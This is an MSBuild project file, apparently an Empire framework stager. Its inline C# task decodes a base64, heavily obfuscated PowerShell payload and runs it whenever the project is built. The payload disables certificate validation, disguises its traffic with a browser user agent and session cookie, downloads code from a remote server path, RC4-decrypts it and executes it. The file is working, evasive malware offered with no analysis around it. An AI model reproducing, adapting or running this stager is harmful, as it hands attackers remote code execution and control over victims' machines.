<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="EmpireStager"><ClassExample /></Target><UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" ><Task><Reference Include="System.Management.Automation" /><Using Namespace="System" /><Using Namespace="System.IO" /><Using Namespace="System.Reflection" /><Using Namespace="System.Collections.Generic" /><Code Type="Class" Language="cs"><![CDATA[ using System;using System.IO;using System.Diagnostics;using System.Reflection;using System.Runtime.InteropServices;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Text;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask{public override bool Execute(){byte[] data = Convert.FromBase64String("LgAoACcAUwBWACcAKQAgACAAKAAiAFMAIgArACIAMgA3ACIAKQAgACAAKABbAHQAeQBQAEUAXQAoACIAewAzAH0AewA0AH0AewAxAH0AewAyAH0AewAwAH0AIgAtAEYAIAAnAHAAbwBpAG4AVABNAGEATgBhAGcARQByACcALAAnAFIAJwAsACcAdgBpAEMARQAnACwAJwBTAFkAcwB0AEUAbQAuAG4ARQAnACwAJwB0AC4AUwBFACcAKQAgACAAKQAgACAAOwAgACAALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAgAC0AZgAnAHQALQBJAHQAJwAsACcARQBtACcALAAnAHMAZQAnACkAIAAgACgAIgB7ADIAfQB7ADAAfQB7ADMAfQB7ADEAfQAiACAALQBmACcAYQBSAGkAYQAnACwAJwBMAGUAOgBaAFYATgAnACwAJwB2ACcALAAnAEIAJwApACAAIAAoACAAWwB0AHkAUABFAF0AKAAiAHsANgB9AHsANQB9AHsAMgB9AHsAMAB9AHsANAB9AHsAMwB9AHsAMQB9ACIALQBmACcAdAAuAHcAZQAnACwAJwBxAHUAZQBTAHQAJwAsACcAbgBlACcALAAnAFIARQAnACwAJwBCACcALAAnAHkAUwB0AEUATQAuACcALAAnAHMAJwApACAAKQA7ACAAJAB7AEsAYAA0AE0AMQB9ACAAIAA9ACAAWwBUAFkAcABFAF0AKAAiAHsAMAB9AHsANQB9AHsANAB9AHsAMgB9AHsAMwB9AHsAMQB9ACIAIAAtAEYAJwBTAFkAcwB0AGUATQAuAE4AJwAsACcAaABlACcALAAnAHQASQAnACwAJwBBAEwAQwBhAGMAJwAsACcAZQBuACcALAAnAEUAdAAuAGMAUgBlAGQAJwApADsAIAAgAC4AKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBTACcALAAnAGUAdAAnACkAIAAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAVQBmAGwAJwAsACcAOQByAGEAJwApACAAKABbAHQAWQBQAGUAXQAoACIAewAwAH0AewAzAH0AewAyAH0AewAxAH0AIgAtAGYAIAAnAFMAWQAnACwAJwBUAC4AZQBuAEMATwBEAGkAbgBnACcALAAnAFgAJwAsACcAcwBUAGUAbQAuAHQAZQAnACkAIAAgACkAIAAgADsALgAoACIAewAxAH0AewAwAH0AIgAtAGYAIAAnAGUAVAAnACwAJwBTACcAKQAgACgAIgB0AFoAOAAiACsAIgA5ADAAIgApACAAKAAgAFsAVABZAFAAZQBdACgAIgB7ADIAfQB7ADEAfQB7ADAAfQAiAC0ARgAnAC4ARQBuAEMATwBEAEkAbgBnACcALAAnAFQAJwAsACcAVABlAFgAJwApACAAIAApACAAIAA7ACAAIAAgACQAewB5AGAAUwBJAHUAWABWAH0AIAA9ACAAWwBUAHkAcABlAF0AKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAQwBvACcALAAnAE4AVgBlAHIAVAAnACkAIAAgADsAIAAgAEkAZgAoACQAewBwAFMAdgBlAHIAUwBgAEkATwBOAGAAVABgAEEAYgBgAEwARQB9AC4AIgBQAFMAYABWAEUAUgBTAGAASQBvAE4AIgAuACIATQBhAGoAYABvAHIAIgAgAC0AZwBlACAAMwApAHsAfQA7ACAAJAB7AFMAYAAyADcAfQA6ADoAIgBlAFgAYABQAEUAQwBUAGAAMQAwADAAQwBvAE4AdABgAEkATgB1AGUAIgA9ADAAOwAkAHsAVwBgAEMAfQA9ACYAKAAiAHsAMgB9AHsAMAB9AHsAMQB9ACIALQBmACcAZQB3AC0ATwBiAGoAJwAsACcAZQBjAHQAJwAsACcATgAnACkAIAAoACIAewA0AH0AewAxAH0AewAyAH0AewA1AH0AewAwAH0AewAzAH0AIgAgAC0AZgAgACcAaQAnACwAJwB5AHMAdABlACcALAAnAG0ALgBOAGUAdAAnACwAJwBlAG4AdAAnACwAJwBTACcALAAnAC4AVwBlAGIAQwBsACcAKQA7ACQAewBVAH0APQAoACgAIgB7ADEAOAB9AHsAMQA1AH0AewAxAH0AewAxADQAfQB7ADEAMAB9AHsAMQA3AH0AewA5AH0AewAxADkAfQB7ADYAfQB7ADEAMwB9AHsAMgB9AHsAOAB9AHsANQB9AHsANAB9AHsAMQAxAH0AewAxADIAfQB7ADcAfQB7ADAAfQB7ADMAfQB7ADIAMAB9AHsAMQA2AH0AIgAgAC0AZgAgACcAMAAnACwAJwBsAGEAJwAsACcANgAuADEAOwAgAFcATwBXADYAJwAsACcAKQAgAGwAaQBrAGUAIAAnACwAJwAvADcALgAwACcALAAnADsAIABUAHIAaQBkAGUAbgB0ACcALAAnAE4AJwAsACcAMQAxAC4AJwAsACcANAAnACwAJwB3ACcALAAnAFcAaQAnACwAJwA7ACAAcgB2ACcALAAnADoAJwAsACcAVAAgACcALAAnAC8ANQAuADAAIAAoACcALAAnAGwAJwAsACcAZQBjAGsAbwAnACwAJwBuAGQAbwAnACwAJwBNAG8AegBpACcALAAnAHMAIAAnACwAJwBHACcAKQApADsAJAB7AHcAYwB9AC4AIgBoAGUAQQBgAGQAYABFAHIAcwAiAC4AKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAGQAJwAsACcAQQBkACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMQB9AHsAMAB9AHsAMgB9ACIALQBmACAAJwBlAHIALQBBAGcAZQAnACwAJwBVAHMAJwAsACcAbgB0ACcAKQAsACQAewBVAH0AKQA7ACQAewBXAGMAfQAuACIAcABgAFIAbwB4AFkAIgA9ACAAIAAoAC4AKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAEUAJwAsACcAcgBJAEEAYgBMACcALAAnAHYAQQAnACkAIAAoACIAewAxAH0AewAwAH0AIgAtAGYAJwBOACcALAAnAFoAdgAnACkAIAAtAHYAQQBsAFUAZQAgACkAOgA6ACIARABlAGYAYQBgAFUAYABMAFQAYAB3AEUAYgBwAFIAYABvAHgAeQAiADsAJAB7AHcAQwB9AC4AIgBQAHIAYABvAFgAWQAiAC4AIgBDAHIARQBgAEQARQBuAHQAaQBhAGAAbABTACIAIAA9ACAAIAAkAHsAawA0AGAAbQAxAH0AOgA6ACIAZABlAGAARgBhAHUATAB0AE4AYABFAFQAdwBgAE8AYABSAEsAYABjAGAAUgBlAGAAZABlAG4AdABJAEEAbABTACIAOwAkAHsASwB9AD0AIAAoACAALgAoACIAewAyAH0AewAxAH0AewAwAH0AewAzAH0AIgAtAGYAJwAtAGMAJwAsACcAZQBUACcALAAnAGcAJwAsACcASABJAEwARABpAHQARQBtACcAKQAgACAAKAAiAHsAMgB9AHsAMQB9AHsAMAB9AHsANAB9AHsAMwB9ACIAIAAtAGYAJwBFADoAJwAsACcAQgBMACcALAAnAFYAYQByAGkAYQAnACwAJwBBACcALAAnAHUARgBMADkAcgAnACkAIAApAC4AIgB2AEEAbABgAFUARQAiADoAOgAiAGEAYABzAEMASQBJACIALgAoACIAewAwAH0AewAyAH0AewAxAH0AIgAtAGYAJwBHACcALAAnAHQAQgB5AHQAZQBzACcALAAnAGUAJwApAC4ASQBuAHYAbwBrAGUAKAAoACgAKAAoACIAewAxAH0AewAzAH0AewA1AH0AewAyAH0AewA0AH0AewA2AH0AewAwAH0AIgAtAGYAJwA/ACwAPAA2ACcALAAnAFAAXQBDAEwATwA4AFMAbgAxACgAJwAsACcALgBvACcALAAnAE0AJwAsACcAZQA9AC0AJwAsACcAKwBVADIAeAAnACwAJwBCACYAQgBRADgARABjADoAdgBqACcAKQApACAAIAAtAFIAZQBwAEwAYQBDAGUAKABbAEMAaABhAHIAXQA2ADYAKwBbAEMAaABhAHIAXQA4ADEAKwBbAEMAaABhAHIAXQA1ADYAKQAsAFsAQwBoAGEAcgBdADEAMgA0ACkAKQApADsAJAB7AHIAfQA9AHsAJAB7AEQAfQAsACQAewBLAH0APQAkAHsAQQBSAGAARwBzAH0AOwAkAHsAUwB9AD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8AC4AKAAnACUAJwApAHsAJAB7AEoAfQA9ACgAJAB7AEoAfQArACQAewBTAH0AWwAkAHsAXwB9AF0AKwAkAHsASwB9AFsAJAB7AF8AfQAlACQAewBrAH0ALgAiAGMATwB1AGAATgBUACIAXQApACUAMgA1ADYAOwAkAHsAUwB9AFsAJAB7AF8AfQBdACwAJAB7AFMAfQBbACQAewBKAH0AXQA9ACQAewBzAH0AWwAkAHsAagB9AF0ALAAkAHsAcwB9AFsAJAB7AF8AfQBdAH0AOwAkAHsARAB9AHwAJgAoACcAJQAnACkAewAkAHsAaQB9AD0AKAAkAHsAaQB9ACsAMQApACUAMgA1ADYAOwAkAHsASAB9AD0AKAAkAHsAaAB9ACsAJAB7AHMAfQBbACQAewBpAH0AXQApACUAMgA1ADYAOwAkAHsAUwB9AFsAJAB7AGkAfQBdACwAJAB7AFMAfQBbACQAewBoAH0AXQA9ACQAewBzAH0AWwAkAHsAaAB9AF0ALAAkAHsAcwB9AFsAJAB7AEkAfQBdADsAJAB7AF8AfQAtAGIAeABvAHIAJAB7AHMAfQBbACgAJAB7AHMAfQBbACQAewBpAH0AXQArACQAewBzAH0AWwAkAHsASAB9AF0AKQAlADIANQA2AF0AfQB9ADsAJAB7AFcAYABDAH0ALgAiAEgAYABlAGEARABFAFIAUwAiAC4AKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAEEAJwAsACcAZABkACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIALQBmACAAJwBDACcALAAnAGUAJwAsACcAbwBvAGsAaQAnACkALAAoACIAewA4AH0AewA2AH0AewAzAH0AewAwAH0AewA3AH0AewA1AH0AewA0AH0AewA5AH0AewAxAH0AewAyAH0AIgAgAC0AZgAgACcAVAAnACwAJwBDAFAAJwAsACcAYgB3AD0AJwAsACcAPQB0AHYAWAB4AEYAdQBVAEkAYgAnACwAJwBnAEIAJwAsACcAYgA5AE4AJwAsACcAZQBzAHMAaQBvAG4AJwAsACcAUQAnACwAJwBzACcALAAnADUAQQBvADYAMQAwACsAJwApACkAOwAkAHsAUwBgAEUAcgB9AD0AIAAkACgAIAAoAC4AKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACcASQBUAEUAbQAnACwAJwBnAGUAJwAsACcAdAAtACcAKQAgACgAJwBWAGEAcgBpAGEAQgBMAGUAJwArACcAOgAnACsAJwB0AFoAOAA5ADAAJwApACkALgAiAFYAYABBAEwAVQBlACIAOgA6ACIAVQBOAGAASQBDAE8ARABFACIALgAiAGcAZQB0AGAAcwBgAFQAcgBJAG4AZwAiACgAIAAkAHsAWQBzAGkAdQBgAHgAVgB9ADoAOgAoACIAewAxAH0AewAzAH0AewAyAH0AewAwAH0AIgAtAGYAIAAnAG4AZwAnACwAJwBGAHIAbwBtAEIAYQAnACwAJwBlADYANABTAHQAcgBpACcALAAnAHMAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAxAH0AewAxADIAfQB7ADcAfQB7ADUAfQB7ADMAfQB7ADEAMQB9AHsAOAB9AHsAMQAzAH0AewA5AH0AewAxADQAfQB7ADAAfQB7ADYAfQB7ADQAfQB7ADIAfQB7ADEAMAB9ACIALQBmACcAQQB1ACcALAAnAGEAQQBCADAAQQAnACwAJwBjAEEAJwAsACcAQQBMAHcAQQB4AEEARABBACcALAAnAEEATgBRAEEANgBBAEQAJwAsACcAQQA2AEEAQwA4ACcALAAnAEEARABFACcALAAnAGMAQQAnACwAJwBMAGcAQQB3ACcALAAnAEMAJwAsACcATgB3AEEAMwBBAEEAPQA9ACcALAAnAEEAJwAsACcASABRAEEAJwAsACcAQQAnACwAJwA0AEEATQBnACcAKQApACkAKQA7ACQAewBUAH0APQAoACIAewAwAH0AewAxAH0AewA0AH0AewAzAH0AewAyAH0AIgAtAGYAIAAnAC8AbAAnACwAJwBvAGcAJwAsACcAcwAuAHAAaABwACcALAAnAG8AYwBlAHMAJwAsACcAaQBuAC8AcAByACcAKQA7ACQAewBEAGEAYABUAGEAfQA9ACQAewBXAGMAfQAuACgAIgB7ADEAfQB7ADAAfQB7ADIAfQAiACAALQBmACAAJwBhAGQARABhAHQAJwAsACcARABvAHcAbgBsAG8AJwAsACcAYQAnACkALgBJAG4AdgBvAGsAZQAoACQAewBTAGAARQBSAH0AKwAkAHsAdAB9ACkAOwAkAHsASQBgAFYAfQA9ACQAewBEAGAAQQBUAGEAfQBbADAALgAuADMAXQA7ACQAewBkAGAAQQBUAEEAfQA9ACQAewBkAGEAYABUAEEAfQBbADQALgAuACQAewBEAEEAYABUAGEAfQAuACIAbABlAG4AYABHAGAAVABIACIAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJAB7AHIAfQAgACQAewBEAGAAQQBUAEEAfQAgACgAJAB7AEkAVgB9ACsAJAB7AEsAfQApACkAfAAmACgAIgB7ADAAfQB7ADEAfQAiAC0AZgAgACcASQBFACcALAAnAFgAJwApAA==");string script = Encoding.Unicode.GetString(data);PSExecute(script);return true;}public static void PSExecute(string cmd){Runspace runspace = RunspaceFactory.CreateRunspace();runspace.Open();Pipeline pipeline = runspace.CreatePipeline();pipeline.Commands.AddScript(cmd);pipeline.InvokeAsync();}} ]]></Code></Task></UsingTask></Project>